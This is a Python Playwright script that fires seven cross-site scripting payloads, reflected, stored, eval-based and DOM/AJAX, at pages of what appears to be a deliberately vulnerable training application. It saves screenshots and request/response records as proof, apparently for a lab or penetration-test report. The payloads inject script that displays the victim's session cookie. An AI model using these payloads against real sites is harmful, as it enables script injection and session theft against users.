import os
import sys
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import sync_playwright

from conftest import NORMAL_UA, TARGET, Client

OUT = Path(os.environ.get("OUT", "/out"))


def banner(vid):
    return (
        "document.body.insertAdjacentHTML('afterbegin',"
        "'<div style=background:#b00020;color:#fff;font:bold 18px monospace;padding:12px>"
        f"{vid} executed on '+location.host+' | document.cookie = '+document.cookie+'</div>')"
    )


def excerpt(text, needle, width=160):
    lines = [ln.strip() for ln in text.splitlines() if needle in ln]
    return "\n".join(ln[:600] for ln in lines[:3]) or "(payload not found in response)"


def record(vid, title, request_lines, response, needle, client):
    OUT.mkdir(parents=True, exist_ok=True)
    client.page.screenshot(path=str(OUT / f"{vid}.png"))
    body = response.text()
    headers = "\n".join(f"{h['name']}: {h['value']}" for h in response.headers_array
                        if h["name"].lower() in ("content-type", "set-cookie", "x-powered-by"))
    text = (
        f"{vid}: {title}\n\n"
        f"REQUEST\n{chr(10).join(request_lines)}\n\n"
        f"RESPONSE\nHTTP {response.status}\n{headers}\n\n"
        f"RESPONSE EXCERPT\n{excerpt(body, needle)}\n\n"
        f"BROWSER\nbanner injected: {client.page.locator('text=' + vid + ' executed').count() > 0}\n"
    )
    (OUT / f"{vid}.txt").write_text(text, encoding="utf-8")
    print(text)


def v1(browser):
    c = Client(browser).login()
    payload = f"<script>{banner('V1')}</script>"
    path = f"/xss_get.php?firstname={quote(payload)}&lastname=x&form=submit"
    c.open(path)
    record("V1", "Reflected XSS (GET), xss_get.php", [f"GET {path}"], c.context.request.get(path), "Welcome", c)


def v2(browser):
    c = Client(browser).login()
    payload = f"';{banner('V2')};//"
    path = f"/xss_json.php?title={quote(payload)}&action=search"
    c.open(path)
    record("V2", "Reflected XSS (JSON in script), xss_json.php", [f"GET {path}"], c.context.request.get(path), "JSONResponseString =", c)


def v3(browser):
    c = Client(browser).login()
    payload = f"x><img src=x onerror=\"{banner('V3')}\">"
    path = f"/xss_href-2.php?name={quote(payload)}&action=vote"
    c.open(path)
    record("V3", "Reflected XSS (HREF attribute), xss_href-2.php", [f"GET {path}"], c.context.request.get(path), "xss_href-3.php?movie=1", c)


def v4(browser):
    c = Client(browser).login()
    payload = banner("V4")
    path = f"/xss_eval.php?date={quote(payload)}"
    c.open(path)
    record("V4", "Reflected XSS (eval), xss_eval.php", [f"GET {path}"], c.context.request.get(path), "eval(", c)


def v5(browser):
    attacker = Client(browser).login()
    payload = f"<script>{banner('V5')}</script>"
    attacker.context.request.post("/xss_stored_1.php", form={"entry": payload, "blog": "submit", "entry_add": ""})
    victim = Client(browser).login()
    victim.open("/xss_stored_1.php")
    record(
        "V5", "Stored XSS (blog), xss_stored_1.php",
        ["POST /xss_stored_1.php  (attacker session)", f"entry={payload}&blog=submit&entry_add=",
         "", "GET /xss_stored_1.php  (victim session)"],
        victim.context.request.get("/xss_stored_1.php"), "V5 executed", victim,
    )


def v6(browser):
    payload = f"<script>{banner('V6')}</script>"
    attacker = Client(browser, user_agent=payload).login()
    attacker.open("/xss_stored_4.php")
    victim = Client(browser).login()
    victim.open("/xss_stored_4.php")
    record(
        "V6", "Stored XSS (User-Agent), xss_stored_4.php",
        ["GET /xss_stored_4.php  (attacker session)", f"User-Agent: {payload}",
         "", f"GET /xss_stored_4.php  (victim session, User-Agent: {NORMAL_UA})"],
        victim.context.request.get("/xss_stored_4.php"), "V6 executed", victim,
    )


def v7(browser):
    c = Client(browser).login()
    payload = '"}]});' + banner("V7") + ";//"
    page = c.open("/xss_ajax_2-1.php")
    page.fill("#title", payload)
    page.wait_for_timeout(2500)
    ajax = f"/xss_ajax_2-2.php?title={quote(payload, safe='')}"
    record(
        "V7", "DOM XSS (AJAX/JSON + eval), xss_ajax_2-1.php / xss_ajax_2-2.php",
        ["GET /xss_ajax_2-1.php, value typed into #title:", payload, "", f"XHR GET {ajax}"],
        c.context.request.get(ajax), "movies", c,
    )


def main():
    selected = sys.argv[1:] or ["v1", "v2", "v3", "v4", "v5", "v6", "v7"]
    print(f"target: {TARGET}\n")
    with sync_playwright() as p:
        browser = p.chromium.launch()
        for name in selected:
            globals()[name](browser)
        browser.close()


if __name__ == "__main__":
    main()
